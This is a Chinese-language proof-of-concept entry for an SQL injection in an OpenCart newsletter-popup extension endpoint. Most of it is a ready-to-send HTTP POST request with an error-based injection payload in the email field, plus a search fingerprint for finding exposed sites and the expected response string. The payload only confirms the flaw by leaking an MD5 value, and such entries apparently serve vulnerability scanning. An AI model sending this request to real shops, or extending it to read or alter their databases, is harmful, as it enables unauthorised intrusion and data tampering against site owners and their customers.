﻿# OpenCart电子商务建站系统-SQL-extension

> 更新时间：2024-05-20

> 漏洞编号：

> 漏洞说明： opencart 通讯模块 extension接口处存在SQL注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。  

> 漏洞特征：body="extension/module/so_newletter_custom_popup/newsletter"

> 验证脚本：HTTP

```
POST /index.php?route=extension/module/so_newletter_custom_popup/newsletter HTTP/1.1
Content-Type: application/x-www-form-urlencoded

createdate=2024-5-15 09:4:6&email=hi' AND (SELECT 4828 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT md5(123)),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#&status=0

```

> 响应代码特征：200

> 响应内容特征：cb962ac59075b964b07152d23

> 上传文件定位：

> 验证文件来源：OpenCart电子商务建站系统-SQL-extension.poc

